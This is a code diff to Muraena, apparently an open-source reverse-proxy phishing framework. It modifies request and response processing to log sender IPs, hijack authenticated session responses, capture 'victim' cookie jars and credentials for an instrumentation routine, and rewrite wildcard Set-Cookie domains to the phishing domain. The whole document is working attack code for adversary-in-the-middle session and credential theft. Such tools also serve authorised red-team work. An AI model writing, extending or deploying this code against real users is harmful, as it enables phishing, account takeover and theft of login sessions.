@@ -129,17 +129,11 @@ func (muraena *MuraenaProxy) RequestProcessor(request *http.Request) (err error)
 	track := muraena.Tracker.TrackRequest(request)
 
 	// DROP
-	dropRequest := false
 	for _, drop := range sess.Config.Drop {
 		if request.URL.Path == drop.Path {
-			dropRequest = true
-			break
+			log.Debug("[Dropped] %s", request.URL.Path)
+			return
 		}
-	}
-
-	if dropRequest {
-		log.Debug("[Dropped] %s", request.URL.Path)
-		return
 	}
 
 	//
@@ -168,11 +162,6 @@ func (muraena *MuraenaProxy) RequestProcessor(request *http.Request) (err error)
 	// Restore query string with new values
 	request.URL.RawQuery = query.Encode()
 
-	// Remove headers
-	for _, header := range sess.Config.Remove.Request.Headers {
-		request.Header.Del(header)
-	}
-
 	// Transform HTTP headers of interest
 	request.Host = muraena.Target.Host
 
@@ -192,25 +181,32 @@ func (muraena *MuraenaProxy) RequestProcessor(request *http.Request) (err error)
 		}
 	}
 
-	lhead := fmt.Sprintf("[%s]", request.RemoteAddr)
-	if sess.Config.Tracking.Enabled {
-		lhead = fmt.Sprintf("[%s]%s", track.ID, lhead)
-	}
-
 	// Add extra HTTP headers
 	for _, header := range sess.Config.Craft.Add.Request.Headers {
 		request.Header.Set(header.Name, header.Value)
 	}
 
-	//l := fmt.Sprintf("%s - [%s][%s%s(%s)%s]", lhead,
-	//	Magenta(request.Method), Magenta(sess.Config.Protocol), Green(muraena.Origin),
-	//	Yellow(muraena.Target), Cyan(request.URL.Path))
+	// Log line
+	lhead := fmt.Sprintf("[%s]", getSenderIP(request))
+	if sess.Config.Tracking.Enabled {
+		lhead = fmt.Sprintf("[%*s]%s", track.TrackerLength, track.ID, lhead)
+	}
 
-	l := fmt.Sprintf("%s - [%s][%s%s%s]",
+	l := fmt.Sprintf("%s [%s][%s%s%s]",
 		lhead,
 		Magenta(request.Method),
-		Magenta(sess.Config.Protocol), Yellow(muraena.Target), Cyan(request.URL.Path))
-	log.Debug(l)
+		Magenta(sess.Config.Protocol), Yellow(request.Host), Cyan(request.URL.Path))
+
+	if track.IsValid() {
+		log.Debug(l)
+	} else {
+		log.Verbose(l)
+	}
+
+	// Remove headers
+	for _, header := range sess.Config.Remove.Request.Headers {
+		request.Header.Del(header)
+	}
 
 	//
 	// BODY
@@ -239,6 +235,38 @@ func (muraena *MuraenaProxy) RequestProcessor(request *http.Request) (err error)
 	}
 
 	return nil
+}
+
+// getSenderIP returns the IP address of the client that sent the request.
+// It checks the following headers in cascade order:
+// - True-Client-IP
+// - CF-Connecting-IP
+// - X-Forwarded-For
+// If none of the headers contain a valid IP, it falls back to RemoteAddr.
+// TODO Update Watchdog to use this function
+func getSenderIP(req *http.Request) string {
+	// Define the headers to check in cascade order
+	headerNames := []string{"True-Client-IP", "CF-Connecting-IP", "X-Forwarded-For"}
+
+	// Loop through the headers and return the first non-empty IP address found
+	for _, headerName := range headerNames {
+		ipAddress := req.Header.Get(headerName)
+		if ipAddress != "" {
+			// The header may contain a comma-separated list of IP addresses; the client's IP is the leftmost one
+			parts := strings.Split(ipAddress, ",")
+			clientIP := strings.TrimSpace(parts[0])
+			return clientIP
+		}
+	}
+
+	log.Debug("Sender IP not found in headers, falling back to RemoteAddr")
+
+	// If none of the headers contain a valid IP, fall back to RemoteAddr
+	ipPort := req.RemoteAddr
+	parts := strings.Split(ipPort, ":")
+	ipAddress := parts[0]
+
+	return ipAddress
 }
 
 func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err error) {
@@ -340,7 +368,7 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 					getSession := false
 					for _, c := range muraena.Session.Config.Tracking.Urls.AuthSessionResponse {
 						if response.Request.URL.Path == c {
-							log.Debug("Going to hijack response: %s (Victim: %+v)", response.Request.URL.Path, victim.ID)
+							//log.Debug("Going to hijack response: %s (Victim: %+v)", response.Request.URL.Path, victim.ID)
 							getSession = true
 							break
 						}
@@ -352,8 +380,12 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 						if err != nil {
 							log.Warning(err.Error())
 						} else {
-							victim.GetVictimCookiejar()
-							go nb.Instrument(victim.ID, victim.Cookies, string(creds))
+							err := victim.GetVictimCookiejar()
+							if err != nil {
+								log.Error(err.Error())
+							} else {
+								go nb.Instrument(victim.ID, victim.Cookies, string(creds))
+							}
 						}
 					}
 				}
@@ -362,7 +394,7 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 
 	} else {
 		if len(response.Cookies()) > 0 {
-			log.Debug("[TODO] Missing cookies to track: \n%s\n%+v", response.Request.URL, response.Cookies())
+			log.Verbose("[TODO] Missing cookies to track: \n%s\n%+v", response.Request.URL, response.Cookies())
 		}
 	}
 
@@ -380,6 +412,18 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 			if header == "Set-Cookie" {
 				for k, value := range response.Header["Set-Cookie"] {
 					response.Header["Set-Cookie"][k] = replacer.Transform(value, false, base64)
+
+					// When the cookie is set for a wildcard domain, we need to replace the domain
+					// with the phishing domain.
+					if strings.Contains(response.Header["Set-Cookie"][k], "domain="+replacer.WildcardPrefix()) {
+						// Replace the domain
+						domain := strings.Split(response.Header["Set-Cookie"][k], "domain=")[1]
+						domain = strings.Split(domain, ";")[0]
+						newDomain := "." + replacer.Phishing
+						response.Header["Set-Cookie"][k] = strings.Replace(response.Header["Set-Cookie"][k], domain, newDomain, 1)
+					}
+
+					log.Debug("Set-Cookie: %s", response.Header["Set-Cookie"][k])
 				}
 			} else {
 				response.Header.Set(header, replacer.Transform(response.Header.Get(header), false, base64))
@@ -410,7 +454,7 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 }
 
 func (muraena *MuraenaProxy) ProxyErrHandler(response http.ResponseWriter, request *http.Request, err error) {
-	log.Error("[errHandler] \n\t%+v \n\t in request %s %s%s", err, request.Method, request.Host, request.URL.Path)
+	log.Debug("[errHandler] \n\t%+v \n\t in request %s %s%s", err, request.Method, request.Host, request.URL.Path)
 }
 
 func (init *MuraenaProxyInit) Spawn() *MuraenaProxy {
